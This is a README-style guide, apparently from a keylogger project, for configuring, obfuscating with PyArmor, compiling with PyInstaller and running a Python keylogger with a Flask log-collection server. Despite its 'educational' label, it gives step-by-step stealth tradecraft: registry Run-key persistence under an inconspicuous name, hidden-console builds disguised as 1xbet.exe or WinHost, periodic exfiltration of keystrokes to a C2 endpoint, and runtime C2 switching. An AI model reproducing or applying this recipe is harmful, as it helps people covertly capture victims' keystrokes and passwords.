# keyloger
A keyloger to demonstrate a keyloging attack just for learning basis

This guide outlines the step-by-step process for manually configuring your educational keylogger (loger.py), compiling it into a Windows executable, and setting up the Flask server (simple_log_receiver.py) for log reception and dynamic C2 URL changes.
Crucial Ethical Reminder:
This documentation is provided purely for educational purposes to understand cybersecurity concepts. Never deploy or experiment with this code on any system you do not own or have explicit, documented permission to test on. Always use an isolated virtual machine environment.
1. Prerequisites & Setup
Before you begin, ensure you have the following installed on your Windows virtual machine and that your Python environment is set up.
* Python 3.x: Installed and configured in your system's PATH.
* Required Python Libraries:
   * pynput (for keylogging)
   * pyinstaller (for compiling Python to .exe)
   * pyarmor (for obfuscation)
   * requests (for HTTP communication in the keylogger)
   * Flask (for the log receiving server)
You can install these by opening a Command Prompt or PowerShell and running:pip install pynput pyinstaller pyarmor requests Flask

* Your Source Files:
   * Save your keylogger's Python code as loger.py.
   * Save your Flask server's Python code as simple_log_receiver.py.
   * Place both files in a dedicated project directory (e.g., C:\KeyloggerProject\). For this guide, we'll assume C:\Users\harsh\Downloads\asdf as your working directory.
2. Manually Configure loger.py (Keylogger Source)
You need to edit loger.py directly to set its initial C2 server URL and the log exfiltration interval, as well as the persistence application name.
1. Open loger.py in a text editor (like Notepad++, VS Code, Sublime Text).
2. Locate and modify the following lines in the --- Configuration --- section:
   * C2_URL (Initial Server URL):
Change the value within the quotes to your Flask server's URL. For local testing, this will typically be http://localhost:8000/upload_logs.
C2_URL = "http://localhost:8000/upload_logs" # <-- CHANGE THIS

   * EXFILTRATION_INTERVAL_SECONDS (Log Sending Frequency):
Set this to your desired interval in seconds.
   * For every minute: 60
   * For every 5 minutes: 300
   * For every 10 minutes: 600
   * For every hour: 3600
   * For every day: 86400
EXFILTRATION_INTERVAL_SECONDS = 180 # Example: 3 minutes. <-- CHANGE THIS

   * PERSISTENCE_APP_NAME (Registry Entry Name):
This is the name that will appear in the Windows Registry's Run key to achieve persistence. Choose something inconspicuous.
PERSISTENCE_APP_NAME = "WindowsCoreService" # <-- You can change this name if desired

      3. Save loger.py after making these changes.
3. Obfuscate with PyArmor
This step obfuscates your Python code to make reverse engineering more difficult.
      1. Open Command Prompt or PowerShell.
      2. Navigate to the Python Scripts Directory:
Many Python tools installed via pip (especially with Microsoft Store Python installations) place their executables in a Scripts subdirectory within your Python installation. For your setup, this is likely:
C:\Users\harsh\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts
To ensure PyArmor is found, navigate to this directory in your terminal first:
cd C:\Users\harsh\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts

(Replace C:\Users\harsh\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts with the actual path to your Python's Scripts directory if it differs).
      3. Run the PyArmor obfuscation command. This will create a temporary obfuscated version of your loger.py in a new subdirectory named pyarmor_obfuscated_source within your original project folder.
.\pyarmor gen C:\Users\harsh\Downloads\asdf\loger.py --output C:\Users\harsh\Downloads\asdf\pyarmor_obfuscated_source

         * .\pyarmor gen: Executes the pyarmor tool from the current directory.
         * C:\Users\harsh\Downloads\asdf\loger.py: The full path to your original loger.py source file.
         * --output C:\Users\harsh\Downloads\asdf\pyarmor_obfuscated_source: Specifies that the obfuscated output (including loger.py and its runtime files) should be placed in a directory named pyarmor_obfuscated_source within your original project folder.
After this command, you will find your obfuscated script at: C:\Users\harsh\Downloads\asdf\pyarmor_obfuscated_source\loger.py.
4. Compile with PyInstaller
Now, you'll compile the obfuscated keylogger into a standalone executable (.exe).
         1. In the same Command Prompt or PowerShell window (still in C:\Users\harsh\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts).
         2. Run the PyInstaller command. This will create your final executable in a new dist folder within your original project directory.
.\pyinstaller --onefile --noconsole --name 1xbet --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --collect-all requests --collect-all platform --collect-all socket --collect-all uuid C:\Users\harsh\Downloads\asdf\pyarmor_obfuscated_source\loger.py --distpath C:\Users\harsh\Downloads\asdf\dist

            * .\pyinstaller: Executes the pyinstaller tool from the current directory.
            * --onefile: Creates a single executable file.
            * --noconsole: Prevents a console window from appearing when the .exe is run (for stealth).
            * --name 1xbet: Sets the name of your final executable to 1xbet.exe. You can change 1xbet to any desired process name (e.g., WinHost, TaskMgrService).
            * --hidden-import ... --collect-all ...: These flags ensure that PyInstaller correctly bundles all necessary modules and their dependencies, preventing ModuleNotFoundError errors at runtime.
            * C:\Users\harsh\Downloads\asdf\pyarmor_obfuscated_source\loger.py: This is the crucial input path, pointing to the obfuscated version of your keylogger.
            * --distpath C:\Users\harsh\Downloads\asdf\dist: This explicit flag tells PyInstaller to place the final .exe in C:\Users\harsh\Downloads\asdf\dist, overriding its default behavior of creating dist in the current working directory (C:\Users\harsh\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts).
After this command, your compiled executable will be located at: C:\Users\harsh\Downloads\asdf\dist\1xbet.exe (or whatever name you chose).
5. Run the Flask Log Receiver Server
This server will listen for incoming logs from your keylogger.
            1. Open a NEW Command Prompt or PowerShell window.
            2. Navigate to your project directory (e.g., cd C:\Users\harsh\Downloads\asdf).
            3. Run the Flask server:
python simple_log_receiver.py

The server will start listening on http://0.0.0.0:8000 (which is accessible via http://localhost:8000 from your VM). Keep this window open.
6. Deploy and Test the Keylogger
               1. Locate your compiled executable: Go to C:\Users\harsh\Downloads\asdf\dist\.
               2. Run the executable: Double-click 1xbet.exe (or your chosen name). A console window should not appear.
               3. Verify Process: Open Task Manager (Ctrl+Shift+Esc), go to the "Details" tab, and look for 1xbet.exe (or your chosen name) running in the background.
               4. Type Keystrokes: Open Notepad, a web browser, or any application and type various characters, spaces, and use the Enter key.
               5. Check Server Logs: Observe the Flask server's Command Prompt window. You should see logs appearing there after the EXFILTRATION_INTERVAL_SECONDS has passed.
               6. Verify Persistence:
               * Restart your VM.
               * After logging in, check Task Manager again to confirm 1xbet.exe (or your chosen name) is automatically running.
               * You can also check the Registry Editor (regedit.exe) at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run for an entry named WindowsCoreService (or your chosen PERSISTENCE_APP_NAME) pointing to the executable in %APPDATA%\SystemData_svc.
7. Dynamically Change C2 Server URL (During Runtime)
Your Flask server has an endpoint that allows you to instruct the keylogger to switch its C2 URL.
               1. Ensure your Flask server is running (from Step 5).
               2. Open a web browser in your VM.
               3. Visit the /set_next_c2 endpoint with your desired new URL.
For example, to make the keylogger send logs to http://localhost:8000/new_log_path (you would need to create a new endpoint in your Flask app for new_log_path), you would type:
http://localhost:8000/set_next_c2?url=http://localhost:8000/new_log_path

Press Enter. You should see a confirmation message in the Flask server's terminal.
               4. Observe Keylogger Behavior: The next time your keylogger sends logs (after the EXFILTRATION_INTERVAL_SECONDS passes), it will receive this new URL. Subsequent log uploads from that keylogger instance will then be directed to http://localhost:8000/new_log_path. You will see this reflected in the Flask server's output as logs arrive at the new endpoint.
By following these manual steps, you gain a deeper understanding of each stage involved in building and controlling such an educational keylogger. Remember to adhere to ethical guidelines and always operate within your controlled VM environment.
